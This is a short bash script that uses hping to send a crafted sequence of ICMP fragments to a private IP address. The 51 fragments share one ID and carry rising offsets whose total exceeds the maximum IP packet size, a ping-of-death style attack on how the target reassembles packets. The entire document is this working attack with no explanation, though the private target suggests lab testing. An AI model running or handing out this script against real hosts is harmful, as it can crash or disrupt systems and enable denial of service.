#!/bin/bash

dst=192.168.100.222
#dst=$1
id=186
#14B ethernet header + 20B ip header + 8B icmp header
dsize=1450
let icmpsize=$dsize+8
hping $dst -1 -x -d $dsize -N $id -c 1

for i in $(seq 50)
do
	let offset=$i*$icmpsize
	hping $dst -1 -x -d $dsize -g $offset -N $id -c 1
done
